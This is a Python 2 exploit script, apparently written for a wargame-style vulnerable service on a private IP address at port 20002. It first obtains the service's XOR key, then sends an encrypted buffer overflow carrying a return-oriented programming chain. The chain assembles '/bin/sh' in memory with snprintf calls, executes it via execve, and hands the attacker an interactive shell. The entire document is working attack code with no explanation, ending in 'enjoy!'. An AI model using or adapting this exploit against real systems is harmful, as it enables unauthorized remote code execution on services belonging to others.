#!/usr/bin/python
import socket
import struct 
import time
import telnetlib

T = "192.168.159.130"
P = 20002
key_sz = 32*4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((T,P))

def crypt(value, key): 
 return ''.join(chr(ord(value[x])^ord(key[x % key_sz])) for x in range(len(value)))
  
print "[*] Obtaining key" 
s.recv(100) # message from srv
s.send("E")
s.send(struct.pack("I", key_sz))
s.send("\x00" * key_sz)
time.sleep(0.5)
s.recv(121) # message from srv
sz = s.recv(4)
sz = struct.unpack("I", sz)[0]
key = s.recv(sz)
print "[+] Key acquired %s" % key.encode("hex")

payl = "A"*131088 #junk
payl += struct.pack("I",0x08049734) #eip -> ret

payl += struct.pack("I",0x080489f0) # snprintf    int snprintf(char *str, size_t size, const char *format, ...);
payl += struct.pack("I",0x080499bc) # ppppr
payl += struct.pack("I",0x0804b420) # snprintf - dest: bss[0]
payl += struct.pack("I",0x00000006) # snprintf - size: 6 (including null byte)
payl += struct.pack("I",0x08049d7d) # snprintf - format: "%s"
payl += struct.pack("I",0x08049d78) # snprintf - src: "/bin/"

payl += struct.pack("I",0x080489f0) # snprintf
payl += struct.pack("I",0x080499bc) # ppppr
payl += struct.pack("I",0x0804b425) # snprintf - dest: bss[5]
payl += struct.pack("I",0x00000002) # snprintf - size: 2
payl += struct.pack("I",0x08049d7d) # snprintf - format: "%s"
payl += struct.pack("I",0x08049d74) # snprintf - src: 's'

payl += struct.pack("I",0x080489f0) # snprintf
payl += struct.pack("I",0x080499bc) # ppppr
payl += struct.pack("I",0x0804b426) # snprintf - dest: bss[6]
payl += struct.pack("I",0x00000002) # snprintf - size: 2
payl += struct.pack("I",0x08049d7d) # snprintf - format: "%s"
payl += struct.pack("I",0x08048bf4) # snprintf - src: 'h'

payl += struct.pack("I",0x080489b0) # execve
payl += struct.pack("I",0xcccccccc) # last return
payl += struct.pack("I",0x0804b420) # execve - command: (bss) "/bin/sh"
payl += "\x00"*8 #execve args + env

print "[*] Encrypting payload"
payl = crypt(payl, key)
payl_size = len(payl)
print "[*] Sending exploit"
s.send("E")
s.send(struct.pack("I", payl_size))
s.send(payl)
time.sleep(0.5)
s.recv(120) # message from srv
sz = s.recv(4)
sz = struct.unpack("I", sz)[0]
buff = s.recv(sz)

s.send("Q")

print "[+] Done... enjoy!"
t = telnetlib.Telnet()
t.sock = s
t.interact()